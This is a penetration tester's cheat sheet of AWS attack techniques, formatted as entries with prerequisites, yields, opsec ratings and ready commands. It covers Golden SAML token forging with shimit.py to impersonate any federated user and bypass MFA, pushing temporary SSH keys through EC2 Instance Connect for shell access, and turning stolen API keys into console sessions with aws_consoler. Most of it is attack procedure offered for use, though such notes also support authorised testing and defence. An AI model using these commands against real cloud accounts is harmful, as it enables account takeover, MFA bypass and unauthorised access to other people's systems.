# AWS Golden SAML Attack

> **Pre-req:** `source $HOME/Pentester/ptTools/venvHTB/bin/activate`

### Golden SAML — Forge Authentication Tokens for AWS/O365 (Bypasses MFA) [added: 2026-04]
- **Tags:** #AWS #GoldenSAML #ADFS #SAML #MFABypass #Shimit #TokenForging #FederationAbuse #O365
- **Trigger:** Compromised on-prem AD FS server or obtained token-signing private key + target uses SAML federation for AWS/O365
- **Prereq:** ADFS token-signing private key (via Mimikatz) + IdP public certificate + IdP name + target role name
- **Yields:** Forged SAML assertions as ANY federated user, bypassing MFA, for AWS console/API and O365
- **Opsec:** Low
- **Context:** Attacker has compromised the on-prem AD FS server and can extract the token-signing private key (via Mimikatz). Allows forging SAML tokens as ANY user, bypassing MFA, for any SAML-federated service including AWS and O365.
- **Payload/Method:**
  ```bash
  # Prerequisites:
  # - Token-signing private key (from ADFS server personal cert store via Mimikatz)
  # - IdP public certificate
  # - IdP name (ADFS URL)
  # - Target role name

  pip install boto3 botocore defusedxml enum python_dateutil lxml signxml

  # shimit.py — Golden SAML forging tool
  python shimit.py \
    -idp http://adfs.lab.local/adfs/services/trust \
    -pk adfs_private_key.pem \
    -c adfs_cert.pem \
    -u domain\admin \
    -n admin@domain.com \
    -r ADFS-admin \
    -r ADFS-monitor \
    -id <AWS_ACCOUNT_ID>

  # Output: Signed SAML assertion usable for sts:AssumeRoleWithSAML
  # Access works even if target user's password is changed or MFA is enforced
  ```
- **Business Impact:** Full account takeover of any federated AWS account or O365 tenant without knowing any user credentials or MFA token. Persists until ADFS signing cert is rotated.

### Instance Connect — Temporary SSH Key Injection [added: 2026-04]
- **Tags:** #AWS #EC2 #InstanceConnect #SSHKeyInjection #LateralMovement #TemporaryAccess #RemoteAccess
- **Trigger:** Have `ec2-instance-connect:SendSSHPublicKey` permission and need shell access to an EC2 instance
- **Prereq:** `ec2-instance-connect:SendSSHPublicKey` permission + target EC2 instance ID + SSH key pair
- **Yields:** 60-second window for SSH access to the target EC2 instance as specified OS user
- **Opsec:** Med
- **Context:** Have `ec2-instance-connect:SendSSHPublicKey` — push a one-time SSH key to any EC2 instance for 60 seconds
- **Payload/Method:**
  ```bash
  # Push your public key to target instance
  aws ec2-instance-connect send-ssh-public-key \
    --region us-east-1 \
    --instance-id <INSTANCE-ID> \
    --availability-zone us-east-1a \
    --instance-os-user ec2-user \
    --ssh-public-key file://~/.ssh/id_rsa.pub

  # Connect within 60 seconds
  ssh -i ~/.ssh/id_rsa ec2-user@<instance-ip>
  ```

### AWS Console Access from API Keys (Credential Conversion) [added: 2026-04]
- **Tags:** #AWS #ConsoleAccess #APIKeys #CredentialConversion #AWSConsoler #FederationURL #SessionHijack
- **Trigger:** Have static AWS API keys (AKIA*) and need browser-based console access
- **Prereq:** Valid AWS access key ID + secret access key (static or STS credentials)
- **Yields:** Browser-based AWS console session URL with the same permissions as the API keys
- **Opsec:** Med
- **Context:** Have static API keys — convert to console session URL for browser access
- **Payload/Method:**
  ```bash
  git clone https://github.com/NetSPI/aws_consoler
  aws_consoler -v -a AKIA<REDACTED> -s <SECRET>
  # Outputs a signin.aws.amazon.com/federation URL → paste in browser
  ```
